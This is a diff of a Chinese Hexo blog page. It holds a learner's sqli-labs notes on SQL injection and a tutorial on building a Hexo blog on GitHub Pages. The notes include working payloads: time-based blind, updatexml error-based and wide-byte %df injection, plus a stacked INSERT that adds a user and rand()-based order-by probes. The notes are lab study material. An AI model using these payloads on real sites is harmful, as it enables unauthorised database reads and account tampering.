+<pre><code>?id=1 and if(ascii(substr(database(),1,1))&gt;100,sleep(10),null)</code></pre><h2 id="关于绕过Waf"><a href="#关于绕过Waf" class="headerlink" title="关于绕过Waf"></a>关于绕过Waf</h2><h3 id="浅谈编码绕过waf"><a href="#浅谈编码绕过waf" class="headerlink" title="浅谈编码绕过waf"></a>浅谈编码绕过waf</h3><h4 id="url编码"><a href="#url编码" class="headerlink" title="url编码"></a>url编码</h4><p>这两天一直在刷sqli-labs，做到现在有一点感触。一开始知道有url编码绕过这种方式，但是对于为什么能绕过成功心里是没B数的。经过这两天的测试，我想说的是，这种url编码绕过简直扯淡。人家waf过滤掉了你，你就算编码传过去一个值，到了php页面又被还原再判断，所以相当于没有任何作用。但还是写一下关于url编码的一些理解：</p>
 <p>在GET传参的时候,Chrome的url会自动进行编码，而编码形式就是utf-8。一般来说，这个自动编码保留字母和数字不编的形式。其实，我感觉utf-8编码就是为了应对中文问题才诞生的。再说一下解码的问题吧，最初我不理解在php后端什么时候将url解码，后来自己用php传参，echo的结果显示，我们在用$_GET[]时，就将url给解码了。即还原了你的传参原值。所以url编码绕过就是扯淡</p>
 <h4 id="0A换行污染"><a href="#0A换行污染" class="headerlink" title="%0A换行污染"></a>%0A换行污染</h4><p>在GET请求时，将URL的SQL注入关键字用%0A分隔，%0A是换行符，在mysql中可以正常执行。可以用%0a代替空格使用</p>
 <h4 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h4><p>这个目前理解尚浅，在列库名或者表名的时候用过，因为可以避免使用单引号闭合。在concat函数里用过，作为分隔符。即0x7e表示‘~’。</p>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>不得不说updatexml()这个报错函数真的太强了，首先你要了解<a href="http://www.cnblogs.com/Loofah/archive/2012/05/10/2494036.html" target="_blank" rel="noopener">Xpath</a>。在Mysql中使用了一下这个函数，发现当XPath 使用路径表达式不符合规范时，就会报错，而报错的内容就非常神奇了。下面贴一张报错内容和语法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or updatexml(1,concat(0x7e,database()),1)</span><br></pre></td></tr></table></figure>
-
-<p>0x7e是为了构造~分割<br><img src="https://s1.ax1x.com/2018/06/03/CTY9zD.png" alt="1"><br>它爆出了我们查询的库名，只要稍加修改，就可以查表、列、字段等。功能强大，依靠它打lab简直爽的不行。报错注入的姿势有很多，po一个写了十种报错函数的<a href="http://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">帖子</a></p>
+<pre><code>or updatexml(1,concat(0x7e,database()),1)</code></pre><p>0x7e是为了构造~分割<br><img src="https://s1.ax1x.com/2018/06/03/CTY9zD.png" alt="1"><br>它爆出了我们查询的库名，只要稍加修改，就可以查表、列、字段等。功能强大，依靠它打lab简直爽的不行。报错注入的姿势有很多，po一个写了十种报错函数的<a href="http://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">帖子</a></p>
 <h3 id="宽子节注入"><a href="#宽子节注入" class="headerlink" title="宽子节注入"></a>宽子节注入</h3><p>对于mysql_escape_string或者是mysql_real_escape_string函数转义的单引号，我们都可以用宽子节注入使单引号逃逸。</p>
 <ul>
 <li>在GET类型中，我们在单引号前加一个Ascii大于128的编码，因为mysql是以gbk形式读编码的。例如我们构造%df’，则转义后变成<code>%df%5c%27</code>，那么mysql执行语句时，看到前两个编码会结合为汉字，从而是单引号逃逸。</li>
-<li>在POST类型中，我们无法再使用%df进行宽子节注入。POST与GET不同，php端不对%df解码（参考对url编码的理解），而是在执行sql查询的时候对%df再进行一次utf-8的编码。结果就是，你在进行sql查询时本想借助%df逃逸，但是现在没有%df可以利用。网上提供了另一种用utf-16进行宽子节注入的payload，这里我拿来用一下，至于为什么utf-16可以借助逃逸，这个我以后学习了16和8的具体转换方式再补上。playload:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1� &apos;</span><br></pre></td></tr></table></figure>
-
-</li>
+<li>在POST类型中，我们无法再使用%df进行宽子节注入。POST与GET不同，php端不对%df解码（参考对url编码的理解），而是在执行sql查询的时候对%df再进行一次utf-8的编码。结果就是，你在进行sql查询时本想借助%df逃逸，但是现在没有%df可以利用。网上提供了另一种用utf-16进行宽子节注入的payload，这里我拿来用一下，至于为什么utf-16可以借助逃逸，这个我以后学习了16和8的具体转换方式再补上。playload:<pre><code>?id=1� &#39;</code></pre></li>
 </ul>
 <h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入顾名思义，这里简单说一下储值型的二次注入：我们将要执行的sql语句通过注册用户操作，存储到服务器里，当我们再一次进行操作时直接调用服务器里我们存储的sql语句就可以了（例如修改密码时）。举一个lab里的例子，我们注册用户登陆后,session会获得一个用户名，在那道题里，没有对session得到的用户名进行过滤，而是直接把密码更新到获取的session的用户名下，如果我们的用户名为admin’#，那么就相当于更新了Admin的密码。</p>
 <h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠注入区别于二次注入，当没有创建新用户的选项时，可以考虑堆叠注入，在登陆时创建一个新用户入。先看一下labs-42的源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);</span><br><span class="line">$password = $_POST[&quot;login_password&quot;];</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE username=&apos;$username&apos; and password=&apos;$password&apos;&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>可以对Username过滤但是未对password过滤，我们就可以为所欲为了。可以通过报错或者盲注查询出表名，构造语句向表中插入用户数据。payload如下：<br><code>login_user=123&amp;login=a&#39;;insert into users values(16,&#39;Hodoger&#39;,&#39;zq1160307775&#39;) #</code><br>show tables成功显示我们插入的用户，前提是你要查到这个登陆基于users这个表，至于怎么查，各显神通了。</p>
+<pre><code>   $username = mysqli_real_escape_string($con1, $_POST[&quot;login_user&quot;]);
+   $password = $_POST[&quot;login_password&quot;];
+   $sql = &quot;SELECT * FROM users WHERE username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code></pre><p>可以对Username过滤但是未对password过滤，我们就可以为所欲为了。可以通过报错或者盲注查询出表名，构造语句向表中插入用户数据。payload如下：<br><code>login_user=123&amp;login=a&#39;;insert into users values(16,&#39;Hodoger&#39;,&#39;zq1160307775&#39;) #</code><br>show tables成功显示我们插入的用户，前提是你要查到这个登陆基于users这个表，至于怎么查，各显神通了。</p>
 <h3 id="order-by注入"><a href="#order-by注入" class="headerlink" title="order by注入"></a>order by注入</h3><p>order by不能与union select 连用，所以注入就要换思路，可以用报错注入或者延时注入。</p>
 <ul>
 <li>报错注入的话，在之前以后列出过十种报错函数可以利用</li>
-<li>还有一种注入手段是依靠rand()函数，order by 后的参数直接为rand()，rand中含有表达式，根据rand(ture/false)返回时序列不同来判断表达式是否正确，这里我们以查询库名为例写一个payload猜解:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?sort=rand(ascii(left(database(),1))&gt;150)</span><br><span class="line"></span><br><span class="line">?sort=rand(ascii(left(database(),1))&lt;200)</span><br></pre></td></tr></table></figure>
-
-</li>
+<li>还有一种注入手段是依靠rand()函数，order by 后的参数直接为rand()，rand中含有表达式，根据rand(ture/false)返回时序列不同来判断表达式是否正确，这里我们以查询库名为例写一个payload猜解:<pre><code>?sort=rand(ascii(left(database(),1))&gt;150)
+</code></pre></li>
 </ul>
-<p>sort参数php端用来接收order by处理的值，其实和布尔盲注的思想有些类似</p>
+<p>?sort=rand(ascii(left(database(),1))&lt;200)<br>```<br>sort参数php端用来接收order by处理的值，其实和布尔盲注的思想有些类似</p>
 <ul>
 <li>延时注入<br>与基于时间的盲注思路差不多，构造 and if语句</li>
 </ul>
@@ -429,7 +575,7 @@
             </div>
             <div class="continue">
             <a href="/2018/05/28/sql简单的注入和常见的waf绕过/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -465,73 +611,54 @@
 <li>首先要有一个Github账号，创建一个Reposity（库），name为username.github.io，其中username必须为你的Github账号名，否则你建立的库只会在Pages下的目录，并不是主页，个人觉得是github官方的限制，总不可能让你无限制的拥有创建主页面域名。</li>
 <li>需要安装<a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>,emmm..如果你不知道什么是<a href="www.baidu.com">Git</a></li>
 <li>需要安装<a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a></li>
-<li>需要安装Hexo,hexo是一款基于Node.js的静态博客框架,就是说我们可以通过hexo创建我们的博文，将md文件转换成静态文件，再部署到Github上;Hexo可以在安装了Node.js之后通过npm安装：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
-
+<li>需要安装Hexo,hexo是一款基于Node.js的静态博客框架,就是说我们可以通过hexo创建我们的博文，将md文件转换成静态文件，再部署到Github上;Hexo可以在安装了Node.js之后通过npm安装：<pre><code class="bash">$ npm install hexo-cli -g</code></pre>
+笔者是在cmd下运行的npm，但看到网上的方法说最好打开Git bash运行安装<h3 id="根目录初始化"><a href="#根目录初始化" class="headerlink" title="根目录初始化"></a>根目录初始化</h3></li>
+<li>首先创建一个文件夹，名字最好为uername.github.io（便与管理站点）。文件夹用来存放Hexo的配置文件</li>
+<li>命令行Cd到该文件夹下，或者右键git bash，执行命令：<pre><code class="bash">$hexo init</code></pre>
 </li>
+<li>安装依赖包：<pre><code class="bash">$nmp install</code></pre>
+此时该文件夹下会多出来很多文件，目录如下：<pre><code class="bash">.
+├── _config.yml
+├── package.json
+├── scaffolds
+├── source
+|   ├── _drafts
+|   └── _posts
+└── themes</code></pre>
+即为<a href="https://blog.csdn.net/gyq1998/article/details/78294689" target="_blank" rel="noopener">Hexo的配置文件</a><h3 id="安装上传插件-hexo-deployer-git"><a href="#安装上传插件-hexo-deployer-git" class="headerlink" title="安装上传插件 hexo-deployer-git"></a>安装上传插件 <strong>hexo-deployer-git</strong></h3><pre><code class="bash">$ npm install hexo-deployer-git --save</code></pre>
+这个插件支持本地修改上传到Github<h2 id="布置自己的网站"><a href="#布置自己的网站" class="headerlink" title="布置自己的网站"></a>布置自己的网站</h2><h3 id="Clone一个你喜欢的骚主题到文件夹"><a href="#Clone一个你喜欢的骚主题到文件夹" class="headerlink" title="Clone一个你喜欢的骚主题到文件夹"></a>Clone一个你喜欢的骚主题到文件夹</h3></li>
 </ol>
-<p>笔者是在cmd下运行的npm，但看到网上的方法说最好打开Git bash运行安装</p>
-<h3 id="根目录初始化"><a href="#根目录初始化" class="headerlink" title="根目录初始化"></a>根目录初始化</h3><ol>
-<li><p>首先创建一个文件夹，名字最好为uername.github.io（便与管理站点）。文件夹用来存放Hexo的配置文件</p>
+<ul>
+<li>这里笔者用的是<a href="http://theme-next.iissnan.com/getting-started.html#select-language" target="_blank" rel="noopener">Next</a>，通过Git命令执行的github克隆：<pre><code class="bash">git clone https://github.com/iissnan/hexo-theme-next themes/next</code></pre>
 </li>
-<li><p>命令行Cd到该文件夹下，或者右键git bash，执行命令：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexo</span> init</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>安装依赖包：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmp</span> install</span><br></pre></td></tr></table></figure>
-
-</li>
-</ol>
-<p>此时该文件夹下会多出来很多文件，目录如下：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── <span class="built_in">source</span></span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure>
-
-<p>即为<a href="https://blog.csdn.net/gyq1998/article/details/78294689" target="_blank" rel="noopener">Hexo的配置文件</a></p>
-<h3 id="安装上传插件-hexo-deployer-git"><a href="#安装上传插件-hexo-deployer-git" class="headerlink" title="安装上传插件 hexo-deployer-git"></a>安装上传插件 <strong>hexo-deployer-git</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
-
-<p>这个插件支持本地修改上传到Github</p>
-<h2 id="布置自己的网站"><a href="#布置自己的网站" class="headerlink" title="布置自己的网站"></a>布置自己的网站</h2><h3 id="Clone一个你喜欢的骚主题到文件夹"><a href="#Clone一个你喜欢的骚主题到文件夹" class="headerlink" title="Clone一个你喜欢的骚主题到文件夹"></a>Clone一个你喜欢的骚主题到文件夹</h3><ul>
-<li><p>这里笔者用的是<a href="http://theme-next.iissnan.com/getting-started.html#select-language" target="_blank" rel="noopener">Next</a>，通过Git命令执行的github克隆：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>需要一定的时间，克隆后的文件夹名为next，在themes目录下<br><img src="https://s1.ax1x.com/2018/05/26/ChVSTP.png" alt="avatar"></p>
-</li>
-<li><p>其中，_config.yml是<a href="http://theme-next.iissnan.com/getting-started.html#select-language" target="_blank" rel="noopener">博客页面的配置文件</a>,使用详情左戳</p>
-</li>
+<li>需要一定的时间，克隆后的文件夹名为next，在themes目录下<br><img src="https://s1.ax1x.com/2018/05/26/ChVSTP.png" alt="avatar"></li>
+<li>其中，_config.yml是<a href="http://theme-next.iissnan.com/getting-started.html#select-language" target="_blank" rel="noopener">博客页面的配置文件</a>,使用详情左戳</li>
 </ul>
 <h3 id="配置主目录"><a href="#配置主目录" class="headerlink" title="配置主目录"></a>配置主目录</h3><ul>
 <li>打开主目录下_config.yml</li>
 </ul>
 <ol>
-<li><p>修改主题，使其指向我们使用的主题</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme:next</span><br></pre></td></tr></table></figure>
+<li>修改主题，使其指向我们使用的主题<pre><code class="bash">theme:next</code></pre>
 </li>
-<li><p>修改deploy项，与你自己的github相对应</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: https://github.com/Hpd0ger/Hpd0ger.github.io.git</span><br><span class="line">  name: Hpdoger</span><br><span class="line">  email: <span class="comment"># 注册Github的邮箱</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
-
+<li>修改deploy项，与你自己的github相对应<pre><code class="bash">deploy:
+type: git
+repo: https://github.com/Hpd0ger/Hpd0ger.github.io.git
+name: Hpdoger
+email: # 注册Github的邮箱
+branch: master</code></pre>
+这个deploy信息是hexo-deployer-git插件的工作认证，执行部署操作的时候，首先会自动初始化git仓库（位置在.deploy_git中），并关联到指定repo与branch，后续public文件夹中自动生成的页面代码将会拷贝至此目录中进行代码管理。若修改了name和email，需要删掉整个.deploy_git再重新部署才会生效以及你的Github账号。<h3 id="部署到GitHub上"><a href="#部署到GitHub上" class="headerlink" title="部署到GitHub上"></a>部署到GitHub上</h3>主要有三个步骤：</li>
+<li>hexo g：<pre><code class="bash">$hexo generate ：将source\_post文件下的md文件转成静态页面到public文件夹下</code></pre>
 </li>
+<li>hexo s:<pre><code class="bash">$hexo s ： 生成本地预览，默认情况下，访问网址为： http://localhost:4000/</code></pre>
+</li>
+<li>hexo d:<pre><code class="bash">$hexo d  ：将.deploy目录部署到GitHub</code></pre>
+特别注意：<pre><code class="bash">$hexo clean ：清除缓存文件(db.json)和已生成的静态文件(public)。在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</code></pre>
+</li>
+<li>现在登陆一下自己的博客，看看有没有成功哦</li>
 </ol>
-<p>这个deploy信息是hexo-deployer-git插件的工作认证，执行部署操作的时候，首先会自动初始化git仓库（位置在.deploy_git中），并关联到指定repo与branch，后续public文件夹中自动生成的页面代码将会拷贝至此目录中进行代码管理。若修改了name和email，需要删掉整个.deploy_git再重新部署才会生效以及你的Github账号。</p>
-<h3 id="部署到GitHub上"><a href="#部署到GitHub上" class="headerlink" title="部署到GitHub上"></a>部署到GitHub上</h3><p>主要有三个步骤：</p>
-<ol>
-<li><p>hexo g：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexo</span> generate ：将<span class="built_in">source</span>\_post文件下的md文件转成静态页面到public文件夹下</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>hexo s:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexo</span> s ： 生成本地预览，默认情况下，访问网址为： http://localhost:4000/</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>hexo d:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexo</span> d  ：将.deploy目录部署到GitHub</span><br></pre></td></tr></table></figure>
-
-<p>特别注意：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexo</span> clean ：清除缓存文件(db.json)和已生成的静态文件(public)。在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>现在登陆一下自己的博客，看看有没有成功哦</p>
-</li>
-</ol>
-<h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><h3 id="创建一篇博文"><a href="#创建一篇博文" class="headerlink" title="创建一篇博文"></a>创建一篇博文</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexo</span> new <span class="string">'文章名'</span></span><br></pre></td></tr></table></figure>
-
+<h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><h3 id="创建一篇博文"><a href="#创建一篇博文" class="headerlink" title="创建一篇博文"></a>创建一篇博文</h3><pre><code class="bash">$hexo new &#39;文章名&#39;</code></pre>
 <p>会在source_post文件下创建一个md文件，系统已经为你写好了标题和日期</p>
-<h3 id="创建一个页面"><a href="#创建一个页面" class="headerlink" title="创建一个页面"></a>创建一个页面</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$hexo</span> new page <span class="string">"页面名"</span> <span class="comment">#如 tages、catagories</span></span><br></pre></td></tr></table></figure>
-
+<h3 id="创建一个页面"><a href="#创建一个页面" class="headerlink" title="创建一个页面"></a>创建一个页面</h3><pre><code class="bash">$hexo new page &quot;页面名&quot; #如 tages、catagories</code></pre>
 <p>创建页面就是在主页上显示你的页面名，即你在博文的开头定义的这篇博文的标签、分类，即属于页面内容<br>会在source\目录下建立对应名称的文件夹，文件夹下有对应名称的md文件</p>
 <h3 id="使用Markdown编辑器"><a href="#使用Markdown编辑器" class="headerlink" title="使用Markdown编辑器"></a>使用Markdown编辑器</h3><p>笔者使用的是cmd markdown，由于画面比较小清新所以一直使用，如果你氪金的话还可以将md文件转化为pdf格式。</p>
 <h3 id="Markdown语法介绍"><a href="#Markdown语法介绍" class="headerlink" title="Markdown语法介绍"></a>Markdown语法介绍</h3><ul>
@@ -546,7 +673,7 @@
             </div>
             <div class="continue">
             <a href="/2018/05/26/利用Hexo和Github搭建个人博客/">
-            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            Continue            <i class="fa fa-angle-right" aria-hidden="true"></i>
             </a>
             </div>
         </article>
@@ -554,7 +681,7 @@
 </section>
 
   <nav class="page-nav">
-    <a class="extend prev" rel="prev" href="/page/4/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
+    <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span>
   </nav>
 
     </main>
